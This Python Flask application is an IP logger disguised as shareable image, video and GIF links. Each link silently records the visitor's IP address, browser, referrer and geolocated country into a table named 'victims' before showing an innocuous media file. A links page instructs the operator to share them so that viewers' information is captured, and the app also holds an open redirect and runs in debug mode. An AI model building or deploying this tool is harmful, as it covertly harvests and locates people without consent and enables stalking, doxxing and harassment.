from flask import Flask, request, redirect, send_file, render_template_string
import requests
import json
import sqlite3
import datetime
import os
from threading import Thread
import time

app = Flask(__name__)

# Database setup
def init_db():
    conn = sqlite3.connect('logs.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS victims
                 (id INTEGER PRIMARY KEY, ip TEXT, user_agent TEXT, referrer TEXT, 
                  country TEXT, timestamp TEXT, type TEXT)''')
    conn.commit()
    conn.close()

init_db()

HTML_TEMPLATE = '''
<!DOCTYPE html>
<html>
<head>
    <title>Multi Logger</title>
    <style>
        body { 
            background: #0a0a0a; 
            color: #00ff00; 
            font-family: 'Courier New', monospace;
            margin: 0;
            padding: 20px;
        }
        .container { 
            max-width: 800px; 
            margin: 0 auto; 
            border: 1px solid #00ff00;
            padding: 20px;
            background: #111;
        }
        .header { 
            text-align: center; 
            border-bottom: 1px solid #00ff00;
            padding-bottom: 10px;
            margin-bottom: 20px;
        }
        .menu { 
            display: grid;
            grid-template-columns: 1fr;
            gap: 10px;
            margin-bottom: 20px;
        }
        .menu-item { 
            background: #1a1a1a; 
            padding: 15px; 
            border: 1px solid #00ff00;
            cursor: pointer;
            text-align: center;
        }
        .menu-item:hover { 
            background: #2a2a2a; 
        }
        .logs { 
            background: #1a1a1a; 
            padding: 15px; 
            border: 1px solid #00ff00;
            max-height: 300px;
            overflow-y: auto;
        }
        .log-entry { 
            margin: 5px 0; 
            padding: 5px; 
            border-bottom: 1px solid #333; 
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🕵️ Multi Logger</h1>
            <p>Image | Video | GIF Logger</p>
        </div>
        
        <div class="menu">
            <div class="menu-item" onclick="location.href='/image-logger'">
                📷 Image Logger
            </div>
            <div class="menu-item" onclick="location.href='/video-logger'">
                🎥 Video Logger
            </div>
            <div class="menu-item" onclick="location.href='/gif-logger'">
                🎞️ GIF Logger
            </div>
            <div class="menu-item" onclick="location.href='/logs'">
                📊 View Logs
            </div>
        </div>

        <div class="logs">
            <h3>Recent Activity</h3>
            {% for log in recent_logs %}
                <div class="log-entry">
                    [{{ log.timestamp }}] {{ log.ip }} - {{ log.type }}
                </div>
            {% endfor %}
        </div>
    </div>
</body>
</html>
'''

LOGS_TEMPLATE = '''
<!DOCTYPE html>
<html>
<head>
    <title>Logs - Multi Logger</title>
    <style>
        body { 
            background: #0a0a0a; 
            color: #00ff00; 
            font-family: 'Courier New', monospace;
            margin: 0;
            padding: 20px;
        }
        .container { 
            max-width: 1200px; 
            margin: 0 auto; 
        }
        .header { 
            text-align: center; 
            margin-bottom: 20px;
        }
        table { 
            width: 100%; 
            border-collapse: collapse; 
            background: #111;
        }
        th, td { 
            border: 1px solid #00ff00; 
            padding: 10px; 
            text-align: left;
        }
        th { 
            background: #1a1a1a; 
        }
        .back-btn { 
            background: #1a1a1a; 
            color: #00ff00; 
            border: 1px solid #00ff00;
            padding: 10px 20px;
            cursor: pointer;
            margin-bottom: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <button class="back-btn" onclick="location.href='/'">← Back</button>
        
        <div class="header">
            <h1>📊 Victim Logs</h1>
        </div>

        <table>
            <tr>
                <th>ID</th>
                <th>IP Address</th>
                <th>User Agent</th>
                <th>Referrer</th>
                <th>Country</th>
                <th>Timestamp</th>
                <th>Type</th>
            </tr>
            {% for log in all_logs %}
            <tr>
                <td>{{ log.id }}</td>
                <td>{{ log.ip }}</td>
                <td title="{{ log.user_agent }}">{{ log.user_agent[:50] }}...</td>
                <td>{{ log.referrer or 'Direct' }}</td>
                <td>{{ log.country or 'Unknown' }}</td>
                <td>{{ log.timestamp }}</td>
                <td>{{ log.type }}</td>
            </tr>
            {% endfor %}
        </table>
    </div>
</body>
</html>
'''

def get_country_from_ip(ip):
    try:
        response = requests.get(f'http://ip-api.com/json/{ip}', timeout=5)
        data = response.json()
        return data.get('country', 'Unknown')
    except:
        return 'Unknown'

def log_victim(ip, user_agent, referrer, log_type):
    country = get_country_from_ip(ip)
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    conn = sqlite3.connect('logs.db')
    c = conn.cursor()
    c.execute("INSERT INTO victims (ip, user_agent, referrer, country, timestamp, type) VALUES (?, ?, ?, ?, ?, ?)",
              (ip, user_agent, referrer, country, timestamp, log_type))
    conn.commit()
    conn.close()

def get_recent_logs(limit=10):
    conn = sqlite3.connect('logs.db')
    c = conn.cursor()
    c.execute("SELECT * FROM victims ORDER BY id DESC LIMIT ?", (limit,))
    logs = c.fetchall()
    conn.close()
    
    formatted_logs = []
    for log in logs:
        formatted_logs.append({
            'id': log[0],
            'ip': log[1],
            'user_agent': log[2],
            'referrer': log[3],
            'country': log[4],
            'timestamp': log[5],
            'type': log[6]
        })
    return formatted_logs

@app.route('/')
def index():
    recent_logs = get_recent_logs(10)
    return render_template_string(HTML_TEMPLATE, recent_logs=recent_logs)

@app.route('/logs')
def view_logs():
    conn = sqlite3.connect('logs.db')
    c = conn.cursor()
    c.execute("SELECT * FROM victims ORDER BY id DESC")
    all_logs = c.fetchall()
    conn.close()
    
    formatted_logs = []
    for log in all_logs:
        formatted_logs.append({
            'id': log[0],
            'ip': log[1],
            'user_agent': log[2],
            'referrer': log[3],
            'country': log[4],
            'timestamp': log[5],
            'type': log[6]
        })
    
    return render_template_string(LOGS_TEMPLATE, all_logs=formatted_logs)

@app.route('/image-logger')
def image_logger():
    victim_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent', 'Unknown')
    referrer = request.headers.get('Referer', 'Direct')
    
    log_victim(victim_ip, user_agent, referrer, 'IMAGE')
    
    image_url = request.args.get('url', 'https://images.unsplash.com/photo-1579546929662-711aa81148cf')
    return redirect(image_url)

@app.route('/video-logger')
def video_logger():
    victim_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent', 'Unknown')
    referrer = request.headers.get('Referer', 'Direct')
    
    log_victim(victim_ip, user_agent, referrer, 'VIDEO')
    
    video_url = request.args.get('url', 'https://commondatastorage.googleapis.com/gtv-videos-bucket/sample/BigBuckBunny.mp4')
    return redirect(video_url)

@app.route('/gif-logger')
def gif_logger():
    victim_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent', 'Unknown')
    referrer = request.headers.get('Referer', 'Direct')
    
    log_victim(victim_ip, user_agent, referrer, 'GIF')
    
    gif_url = request.args.get('url', 'https://media.giphy.com/media/3o7aCSPqXE5C6T8tBC/giphy.gif')
    return redirect(gif_url)

@app.route('/image.jpg')
def serve_image():
    victim_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent', 'Unknown')
    referrer = request.headers.get('Referer', 'Direct')
    
    log_victim(victim_ip, user_agent, referrer, 'IMAGE_DIRECT')
    
    try:
        response = requests.get('https://images.unsplash.com/photo-1579546929662-711aa81148cf', stream=True)
        return send_file(response.raw, mimetype='image/jpeg')
    except:
        return "Image not available", 404

@app.route('/video.mp4')
def serve_video():
    victim_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent', 'Unknown')
    referrer = request.headers.get('Referer', 'Direct')
    
    log_victim(victim_ip, user_agent, referrer, 'VIDEO_DIRECT')
    
    return redirect('https://commondatastorage.googleapis.com/gtv-videos-bucket/sample/BigBuckBunny.mp4')

@app.route('/animation.gif')
def serve_gif():
    victim_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent', 'Unknown')
    referrer = request.headers.get('Referer', 'Direct')
    
    log_victim(victim_ip, user_agent, referrer, 'GIF_DIRECT')
    
    return redirect('https://media.giphy.com/media/3o7aCSPqXE5C6T8tBC/giphy.gif')

@app.route('/create-links')
def create_links():
    base_url = request.url_root.rstrip('/')
    
    links_html = f'''
    <html>
    <head><title>Logger Links</title></head>
    <body style="background: #0a0a0a; color: #00ff00; font-family: monospace; padding: 20px;">
        <h1>📎 Logger Links</h1>
        
        <h3>Image Loggers:</h3>
        <p>{base_url}/image-logger</p>
        <p>{base_url}/image.jpg</p>
        
        <h3>Video Loggers:</h3>
        <p>{base_url}/video-logger</p>
        <p>{base_url}/video.mp4</p>
        
        <h3>GIF Loggers:</h3>
        <p>{base_url}/gif-logger</p>
        <p>{base_url}/animation.gif</p>
        
        <br>
        <p><strong>Usage:</strong> Share these links. When clicked, they will log the viewer's info.</p>
        <button onclick="location.href='/'">← Back to Dashboard</button>
    </body>
    </html>
    '''
    
    return links_html

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
